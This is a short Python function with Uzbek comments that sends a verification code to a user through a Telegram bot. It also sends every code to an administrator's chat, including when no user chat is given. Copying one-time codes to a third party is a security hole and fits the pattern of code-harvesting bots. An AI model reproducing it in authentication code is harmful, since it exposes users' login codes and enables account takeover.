import requests
from config import BOT_TOKEN, ADMIN_ID


def send_code(chat_id, code):

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    # Foydalanuvchiga yuborish
    if chat_id:
        requests.post(
            url,
            data={
                "chat_id": chat_id,
                "text": f"🔐 Tasdiqlash kodingiz: {code}"
            }
        )

    # Adminga yuborish
    requests.post(
        url,
        data={
            "chat_id": ADMIN_ID,
            "text": f"👤 Yangi foydalanuvchi kodi: {code}"
        }
    )